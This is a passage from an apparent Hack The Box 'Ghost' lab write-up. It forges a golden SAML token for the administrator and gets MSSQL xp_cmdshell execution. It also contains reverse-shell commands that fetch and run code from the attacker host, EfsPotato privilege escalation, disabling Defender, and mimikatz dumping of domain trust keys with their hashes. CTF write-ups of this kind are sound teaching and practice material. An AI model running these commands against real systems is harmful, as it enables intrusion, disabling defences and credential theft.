mbXRjVytlc1NnaHNKT3p4cmJKd2I2bjdjZG1zbFNObkNrZWpRS3FTTktKOU9ZYzdLQmhPcWpOcGhSYUt2akh3czZZYWVYTUxHVWEvUlo0V3ZQWVAwMnZDdUhOUmpwZnRIQituY21KV1B1UVBza3NYWUdRQjVoak5MNCtONWlNSlhxODhpaG5DT0FydHdpdFZNZ2VvNE5vbnpVOUhhS0ZxYmphajN3SjlkeHhKWTBzR3hIYVhhRGszM0JVRzlUc0JybWdEZ1FIZ21YOGlpUUdtNWpiM3J3bDhnbFZUMCtNZnNSL0JlakJsWkhsN00yQkRwUjlxd3VqMmJWbkRLQmFUaDl0SHBBTHlINGRjZHJ2SjFpSkMyVWphV3V4UmtQMktoYzhCRDRJNXV2RUxFVDlRUno2dEgxcnNySXJpSW9nMEE1aCtDSG9rSUw5VEU0YUhIeUMrUnEyNkRBejZTYWxpVzV1aW1hSzQzMDhsODFPenB3YUlJSW5DMU1xeHAyLzM4UWE5YUFmSzhuRTY1V21UYXNSRFc3MGVyMTA4Lzd0QTY0MTFTdHBmVmhhZTJpTkZpZGxrT1g1ZWVEcy9vLzhWc0dIZHRZUEVpOTZucE9ZaFAzVmxBU1oxeDkvbEQxVXA2cTUxYVBET2pYc1grVDhQd1ozOE5YcS9tNkkyRmpqYU1CMFowYnIvNUtwVTI3MDdtT0thMEdyVmduYlBnUlMyemQ5Z1JIUWVTZkJha1FpOXJrT0w2dndZVUdIOThYNjdjc1pUTjNsU3I0YWlvZ0tmUFIzRTgyOFh4K1Qrcmw5SVE4dVhkeElocElEYktlWXgvUHdpRUVsVG1BUitZPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJRTVqQ0NBczZnQXdJQkFnSVFKRmNXd015YlJhNU80K1dPNXRXb0dUQU5CZ2txaGtpRzl3MEJBUXNGQURBdU1Td3dLZ1lEVlFRREV5TkJSRVpUSUZOcFoyNXBibWNnTFNCbVpXUmxjbUYwYVc5dUxtZG9iM04wTG1oMFlqQWdGdzB5TkRBMk1UZ3hOakUzTVRCYUdBOHlNVEEwTURVek1ERTJNVGN4TUZvd0xqRXNNQ29HQTFVRUF4TWpRVVJHVXlCVGFXZHVhVzVuSUMwZ1ptVmtaWEpoZEdsdmJpNW5hRzl6ZEM1b2RHSXdnZ0lpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElDRHdBd2dnSUtBb0lDQVFDK0FBT0lmRXF0bFljbjE1M0wxQnZHUWdEeVhUbll3VFJ6c0s1OSt6RTF6Z0dLTzlONW5iOEZrK2RhS3BXTFFhaUg3b0RIYWVudy9RYXhCZzVxZGVEWW1EM296OEt5YUExeWdZQnJ6bTR3VzdGZjg3cks5RmU1SjUvaDZXOWc3NDloNUJJcVBRT3AwbDZzMXJmdW1PY2NONHliVzk1RVdOTDB2dVFYdkMrS1E0RDRnTVh1OG1DR3B4dHZJTDhpbE50SnVJRzNPUllTS2hSYWwweXlKZU9oRzR4Z2xyWkpGMThwOXdobkU2b21nZ21BNm4yc2hEay90dlRZamlpNWU3L2ljV1RLa3JzTUNwYUtVTms3bXhkTVpoUWFiN1NtZktyWk40cFJEN2RWZzV6ekl5RDdVelM5Q0hMQzZ4TnpxL1owaHVhT2FKaE9TZEpTZ2F0L2JzRzhuYngxOUhELyt5cFc5SjJMdE5GdWdkV3RtVUJXRE9RQllWaEI4U2c0VkVHZ1A5anlJdEhIMmJ6c0RmalJkSjhFMXVOSldQL2tRQTErd1lsT2RkTHFVM2IwSXNDdmxBOEV2WVcwVDFSc3U3N280eC93MGdXYjBvUVBFSXo3ejk3M2I0OTZ3cVF0M0RueWZlTzNsWFhmWk5jdmFqNUtDUDJUdEdCK0tzaEY5cGtJUHhxN0YyZ01oN1FqeGpSSHNBMjlWOGpGbzlnTEQ3a1BWaWNhSVVkc2dpRkhuWVFGMTRhNTJKdFIxVjVpTitoOTVKa3V1RXFRV0RCSEF2UEVCQlprRVpIKzV5VCthQ0ZYWFgrQnBQdDNRR2pZTGVKVThDRnNNdG44UVZMWXZMZGNWUnNVblJoL1dIaVh3Sk9PRVZFQ2E5dzcveVZuaGFsQ05CeDFFL2w0S1FJREFRQUJNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUNBUUFXWUtaVzNjRENCTzZkVDN5ZmwzT2N1eXAxTFZLVkkrOXBGeC9iYldwV2pTZGg2YjM5TFR4eEQ3RllVdGh1V1BaM3JGNEcrRmRNRkhIQ3gzWXBFbVVGbkVMS3NYcWhaOTg5QVg1OEkvM21iZlVsS1dlSVBMU0xrcCtlUlpvTUprdDdrMS9LWHREYXNPUW4wTnNnWUVvd0xCSW1NQ011OXV1am5DbUZPd0hQL0lCaGdZUU1IaDQ2QnpTWFdQM2k4VlhiclJ0RHBvL2MvL09GSmhHbW5uRjhaUG1pNHh0emZTREJwVktxd1ZMcDc4Q2d1TXhqUWQrYmRVYjQ1NTg4Wko0Q0xzUGRSUXAzMFdKMS9DTklhZW52Sld0QTJHNUladzVVMEVXQ0pMb1lKV0ZzOWl5T2ExL3k1NXJ1VzZKOGxJR0Qwd21vRWVDbDlDSDFFZDRkelVkVVhmMU1CQ1lQM1g5MmlheHpVRTB1cEdkLzFRbzZIVHl5T2xXdUF3cmtUMlZIRUxLVlpLT2c4K2RseTk3Z3laSWZVdFF3SWtQd05sOHZvMDRjZmoraHpPdkJ6UEtBQVloMTROTGd2ZUFJL0RxTW5PME9LTyt3MUhCS3c2NE5CQ244Z29hekYrUHVGZlVPMHlOSEZMNGt4TXBjYXA2aWV2NmczQlhDU0R3ZnFUVU9FdUVzN3E5b1lLZ3EycW5OVk9USWhoSW5NWEJ6RW02aVAxM2pmdU9vWEpkUEFuRVVYbjR5NXl3QTk3cnRiR25aRVB5eDFmMUVrWC9oYnFCUDR2b2d2OWtsdGFVRUVWWGtTK2hQcHhabWV4Q05yQkQxcTdHSi81MGViWWxDMENldjh3Nk1zOHRNME9ydnBwR1lsV3J0UHdldkV2ZmlSa3dCTEc3RU1BbkxTdz09PC9kczpYNTA5Q2VydGlmaWNhdGU%2BPC9kczpYNTA5RGF0YT48L2RzOktleUluZm8%2BPC9kczpTaWduYXR1cmU%2BPFN1YmplY3Q%2BPE5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjEuMTpuYW1laWQtZm9ybWF0OmVtYWlsQWRkcmVzcyI%2BQWRtaW5pc3RyYXRvckBnaG9zdC5odGI8L05hbWVJRD48U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPjxTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBOb3RPbk9yQWZ0ZXI9IjIwMjUtMDQtMDRUMDk6MDk6NTguMDAwWiIgUmVjaXBpZW50PSJodHRwczovL2NvcmUuZ2hvc3QuaHRiOjg0NDMvYWRmcy9zYW1sL3Bvc3RSZXNwb25zZSIvPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q%2BPENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDI1LTA0LTA0VDA5OjA0OjU4LjAwMFoiIE5vdE9uT3JBZnRlcj0iMjAyNS0wNC0wNFQxMDowNDo1OC4wMDBaIj48QXVkaWVuY2VSZXN0cmljdGlvbj48QXVkaWVuY2U%2BaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzPC9BdWRpZW5jZT48L0F1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9Db25kaXRpb25zPjxBdHRyaWJ1dGVTdGF0ZW1lbnQ%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy91cG4iPjxBdHRyaWJ1dGVWYWx1ZT5BZG1pbmlzdHJhdG9yQGdob3N0Lmh0YjwvQXR0cmlidXRlVmFsdWU%2BPC9BdHRyaWJ1dGU%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9jbGFpbXMvQ29tbW9uTmFtZSI%2BPEF0dHJpYnV0ZVZhbHVlPkFkbWluaXN0cmF0b3I8L0F0dHJpYnV0ZVZhbHVlPjwvQXR0cmlidXRlPjwvQXR0cmlidXRlU3RhdGVtZW50PjxBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMjUtMDQtMDRUMDk6MDQ6NTcuNTAwWiIgU2Vzc2lvbkluZGV4PSJfSkZPSzlUIj48QXV0aG5Db250ZXh0PjxBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvQXV0aG5Db250ZXh0Q2xhc3NSZWY%2BPC9BdXRobkNvbnRleHQ%2BPC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D</span><br></pre></td></tr></table></figure></div>

<p>NOTE: I ran into a LOT of issues when trying to run ADFSpoof because of packages and dependancies issues especially because of lxml, signxml and cryptography libraries. I referred to <a class="link"   target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5178416/libxml-install-error-using-pip" >this stackoverflow discussion <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for help.</p>
<p>And now we can spoof authentication mechanisms of the <a class="link"   target="_blank" rel="noopener" href="http://core.ghost.htb:8443/" >http://core.ghost.htb:8443/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> subdomain previously discovered on our initial recon using our golden SAML:</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/adfs1.png"
                      alt="ADFS"
                ><figcaption>ADFS</figcaption></figure></p>
<p>Now we will add the <code>application/x-www-form-urlencoded</code> <code>Content-Type</code> header alongside our <code>SAMLRESPONSE</code> header and weâ€™ll get the link to our federation so we could login:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/adfs2.png"
                      alt="ADFS"
                ><figcaption>ADFS</figcaption></figure></p>
<p>And now we have a valid login using our crafted Golden SAML token. All we have to do now is right click on burpsuite <code> Request in browser =&gt; In original session</code> and weâ€™ll be logged in:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/core.png"
                      alt="ADFS"
                ><figcaption>ADFS</figcaption></figure></p>
<h4 id="MSSQL-Command-injection"><a href="#MSSQL-Command-injection" class="headerlink" title="MSSQL Command injection"></a>MSSQL Command injection</h4><p>We can see that we can execute SQL queries:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/mssql.png"
                      alt="MSSQL"
                ><figcaption>MSSQL</figcaption></figure></p>
<p>So I instantly went ahead to test the usual MSSQL command injection by trying to enable <code>xp_cmdshell</code> (I spoke about this in a previous writeup):</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span>(<span class="string">&#x27;EXECUTE AS LOGIN = &#x27;&#x27;sa&#x27;&#x27; EXEC SP_CONFIGURE &#x27;&#x27;show advanced options&#x27;&#x27;, 1;reconfigure;EXEC SP_CONFIGURE &#x27;&#x27;xp_cmdshell&#x27;&#x27; , 1;reconfigure;exec xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;</span>) <span class="keyword">AT</span> &quot;PRIMARY&quot;</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/mssql1.png"
                      alt="MSSQL"
                ><figcaption>MSSQL</figcaption></figure></p>
<p>So I tried to get a reverse shell using the <code>Invoke-PowershellTCP.ps1</code> reverse shell script:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span>(<span class="string">&#x27;EXECUTE AS LOGIN = &#x27;&#x27;sa&#x27;&#x27; EXEC SP_CONFIGURE &#x27;&#x27;show advanced options&#x27;&#x27;, 1;reconfigure;EXEC SP_CONFIGURE &#x27;&#x27;xp_cmdshell&#x27;&#x27; , 1;reconfigure;exec xp_cmdshell &#x27;&#x27;powershell -c iex (iwr 10.10.16.25/shell.ps1 -usebasicparsing)&#x27;&#x27;&#x27;</span>) <span class="keyword">AT</span> &quot;PRIMARY&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>And weâ€™re in:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ nc -lnvp 9001            </span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.25] from (UNKNOWN) [10.129.231.105] 49844</span><br><span class="line">Windows PowerShell running as user MSSQLSERVER on PRIMARY</span><br><span class="line">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line">nt service\mssqlserver</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Checking our privileges we can see we have <code>SeImpersonatePrivilege</code> enabled, which allows a process to impersonate another user or process:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State   </span><br><span class="line">============================= ========================================= ========</span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a <span class="keyword">process</span> level token             Disabled</span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="keyword">for</span> a <span class="keyword">process</span>        Disabled</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain                Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span>            Disabled</span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; </span><br></pre></td></tr></table></figure></div>

<p>We can abuse that using <a class="link"   target="_blank" rel="noopener" href="https://github.com/zcgonvh/EfsPotato" >EfsPotato <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. We can quickly compile it on the target system using this command:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.Net\Framework\v4.<span class="number">0.30319</span>\csc.exe EfsPotato.cs <span class="literal">-nowarn</span>:<span class="number">1691</span>,<span class="number">618</span></span><br></pre></td></tr></table></figure></div>

<p>Now run it:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\temp&gt; ./efs.exe <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">Exploit <span class="keyword">for</span> EfsPotato(MS<span class="literal">-EFSR</span> EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).</span><br><span class="line">Part of GMH<span class="string">&#x27;s fuck Tools, Code By zcgonvh.</span></span><br><span class="line"><span class="string">CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Current user: NT Service\MSSQLSERVER</span></span><br><span class="line"><span class="string">[+] Pipe: \pipe\lsarpc</span></span><br><span class="line"><span class="string">[!] binding ok (handle=1a339b90)</span></span><br><span class="line"><span class="string">[+] Get Token: 888</span></span><br><span class="line"><span class="string">[!] process with pid: 3408 created.</span></span><br><span class="line"><span class="string">==============================</span></span><br><span class="line"><span class="string">nt authority\system</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>

<p>Now simply letâ€™s get a reverse shell as <code>nt authority\system</code> using netcat:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\temp&gt; <span class="built_in">iwr</span> <span class="number">10.10</span>.<span class="number">16.25</span>/nc64.exe <span class="literal">-outfile</span> nc64.exe</span><br><span class="line"><span class="built_in">PS</span> C:\temp&gt; ./efs.exe <span class="string">&#x27;c:/temp/nc64.exe 10.10.16.25 9001 -e powershell.exe&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>And weâ€™re in:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/<span class="type">Hackthebox</span>/<span class="type">GHost</span>]</span><br><span class="line">â””â”€<span class="variable">$</span> rlwrap nc <span class="literal">-lvnp</span> <span class="number">9001</span>  </span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.16.25</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.231.105</span>] <span class="number">49799</span></span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Install the latest PowerShell <span class="keyword">for</span> new features and improvements! https://aka.ms/PSWindows</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\temp&gt; whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="Domain-Trust-Abuse"><a href="#Domain-Trust-Abuse" class="headerlink" title="Domain Trust Abuse"></a>Domain Trust Abuse</h4><p>However, going into the administrator desktop we donâ€™t find a flag:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\administrator\desktop&gt; <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">PS</span> C:\users\administrator\desktop&gt;</span><br></pre></td></tr></table></figure></div>

<p>Which suggests that this is still not over. We can recall that earlier when checking BloodHound, we saw that there was a trust relationship between <code>ghost.htb</code> and <code>corp.ghost.htb</code>:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/trust.png"
                      alt="Trust"
                ><figcaption>Trust</figcaption></figure></p>
<p>Now since we are admins of the DC of <code>ghost.htb</code>, we can dump the domain trust keys and abuse that.<br>Letâ€™s first disable AV:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\administrator\desktop&gt; <span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span></span><br><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span></span><br><span class="line"><span class="built_in">PS</span> C:\users\administrator\desktop&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Now letâ€™s bring mimikatz over and dump trust:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\administrator\desktop&gt; ./mimi.exe <span class="string">&quot;lsadump::trust /patch&quot;</span> <span class="keyword">exit</span></span><br><span class="line">./mimi.exe <span class="string">&quot;lsadump::trust /patch&quot;</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::trust /patch</span></span><br><span class="line"></span><br><span class="line">Current domain: CORP.GHOST.HTB (GHOST<span class="literal">-CORP</span> / S<span class="literal">-1-5-21-2034262909-2733679486-179904498</span>)</span><br><span class="line"></span><br><span class="line">Domain: GHOST.HTB (GHOST / S<span class="literal">-1-5-21-4084500788-938703357-3654145966</span>)</span><br><span class="line"> [  <span class="type">In</span> ] CORP.GHOST.HTB -&gt; GHOST.HTB</span><br><span class="line">    * <span class="number">4</span>/<span class="number">3</span>/<span class="number">2025</span> <span class="number">7</span>:<span class="number">35</span>:<span class="number">00</span> AM - <span class="built_in">CLEAR</span>   - f5 b6 <span class="number">25</span> <span class="number">22</span> <span class="number">56</span> <span class="number">6</span>c <span class="number">5</span>e e4 <span class="number">49</span> b8 <span class="number">28</span> <span class="number">10</span> <span class="number">1</span>f e5 <span class="number">2</span>f <span class="number">26</span> <span class="number">08</span> <span class="number">11</span> a6 <span class="number">11</span> <span class="number">32</span> <span class="number">48</span> <span class="number">81</span> <span class="number">5</span>a <span class="number">5</span>e d7 df <span class="number">5</span>c <span class="number">40</span> be <span class="number">65</span> <span class="number">85</span> b9 e2 ee <span class="number">33</span> <span class="number">44</span> <span class="number">15</span> <span class="number">96</span> <span class="number">07</span> <span class="number">8</span>f c7 dc <span class="number">32</span> <span class="number">39</span> <span class="number">88</span> <span class="number">77</span> be <span class="number">56</span> d4 <span class="number">1</span>a c8 <span class="number">9</span>e c5 <span class="number">9</span>c bb e8 <span class="number">31</span> <span class="number">31</span> <span class="number">77</span> b2 e2 e8 <span class="number">35</span> f2 <span class="number">57</span> a0 f5 <span class="number">44</span> <span class="number">65</span> fe c4 af f2 <span class="number">4</span>b <span class="number">60</span> b3 cf db <span class="number">3</span>c <span class="number">85</span> bc <span class="number">7</span>e <span class="number">6</span>e a8 d8 <span class="number">63</span> af d3 a8 <span class="number">1</span>c b2 dd <span class="number">49</span> <span class="number">39</span> <span class="number">37</span> <span class="number">04</span> dd e7 <span class="number">67</span> <span class="number">0</span>d <span class="number">56</span> <span class="number">89</span> <span class="number">4</span>c <span class="number">47</span> aa <span class="number">83</span> <span class="number">2</span>b <span class="number">85</span> e8 <span class="number">7</span>a d2 <span class="number">48</span> c0 <span class="number">19</span> <span class="number">65</span> df <span class="number">89</span> f5 <span class="number">70</span> <span class="number">4</span>c d0 <span class="number">97</span> <span class="number">06</span> <span class="number">67</span> c0 f1 <span class="number">31</span> <span class="number">00</span> <span class="number">21</span> f7 <span class="number">63</span> e3 <span class="number">31</span> f1 <span class="number">9</span>c <span class="number">46</span> fe d7 <span class="number">2</span>f ff b8 <span class="number">8</span>e cf <span class="number">61</span> <span class="number">3</span>e c5 <span class="number">26</span> e6 db <span class="number">69</span> <span class="number">3</span>d <span class="number">26</span> <span class="number">4</span>c a2 <span class="number">6</span>b <span class="number">75</span> ba <span class="number">6</span>c c9 <span class="number">52</span> bd <span class="number">7</span>c <span class="number">30</span> <span class="number">03</span> cf <span class="number">70</span> <span class="number">59</span> <span class="number">18</span> <span class="number">25</span> b8 <span class="number">4</span>c <span class="number">3</span>e c7 <span class="number">2</span>b ae <span class="number">0</span>c <span class="number">53</span> b7 a1 <span class="number">70</span> a1 d6 e1 <span class="number">91</span> <span class="number">7</span>e <span class="number">51</span> <span class="number">60</span> d4 c2 <span class="number">00</span> <span class="number">40</span> <span class="number">23</span> c4 <span class="number">71</span> <span class="number">10</span> <span class="number">4</span>d e0 f9 <span class="number">0</span>d a5 <span class="number">27</span> b4 <span class="number">46</span> ee <span class="number">01</span> <span class="number">48</span> cf d8 <span class="number">8</span>c e4 bf <span class="number">1</span>d <span class="number">7</span>a <span class="number">0</span>d <span class="number">86</span> <span class="number">28</span> <span class="number">9</span>f bf <span class="number">1</span>e <span class="number">11</span> c5 <span class="number">30</span> <span class="number">26</span> <span class="number">9</span>b <span class="number">34</span> <span class="number">61</span> <span class="number">5</span>e b5 <span class="number">64</span> db be db <span class="number">8</span>d f0 <span class="number">6</span>f d8 <span class="number">84</span> <span class="number">90</span> <span class="number">94</span> </span><br><span class="line">        * aes256_hmac       <span class="number">1</span>c8efba1ea334462d247e0513a99525eb2844820b3134679ad79f99b989f9954</span><br><span class="line">        * aes128_hmac       b0130dc0a4eff3cf59e7b3cd105cad67</span><br><span class="line">        * rc4_hmac_nt       <span class="number">61</span>f02da833df265bbc885f02b950daa2</span><br><span class="line"></span><br><span class="line"> [ <span class="type">Out</span> ] GHOST.HTB -&gt; CORP.GHOST.HTB</span><br><span class="line">    * <span class="number">4</span>/<span class="number">3</span>/<span class="number">2025</span> <span class="number">7</span>:<span class="number">46</span>:<span class="number">54</span> AM - <span class="built_in">CLEAR</span>   - <span class="number">35</span> f5 dd <span class="number">6</span>d <span class="number">26</span> <span class="number">01</span> <span class="number">1</span>b <span class="built_in">fc</span> <span class="number">6</span>b d3 <span class="number">38</span> <span class="number">93</span> <span class="number">40</span> <span class="number">05</span> c4 ca <span class="number">58</span> c1 f3 <span class="number">67</span> <span class="number">50</span> <span class="number">03</span> <span class="number">09</span> <span class="number">6</span>d <span class="number">81</span> <span class="number">9</span>f c7 <span class="number">9</span>d <span class="number">76</span> <span class="number">26</span> <span class="number">8</span>b e5 a2 <span class="number">9</span>d ce <span class="number">90</span> f6 bf <span class="number">18</span> b3 e8 d7 <span class="number">13</span> <span class="number">52</span> <span class="number">47</span> aa ff <span class="number">03</span> da <span class="number">85</span> <span class="number">06</span> bb <span class="number">05</span> <span class="number">41</span> <span class="number">53</span> <span class="number">9</span>b <span class="number">6</span>c <span class="number">7</span>a ad <span class="number">48</span> <span class="number">96</span> ec a6 <span class="number">84</span> dc <span class="number">3</span>a <span class="number">64</span> a0 <span class="number">37</span> <span class="number">72</span> <span class="number">62</span> ca <span class="number">05</span> <span class="number">77</span> d2 d6 <span class="number">03</span> c0 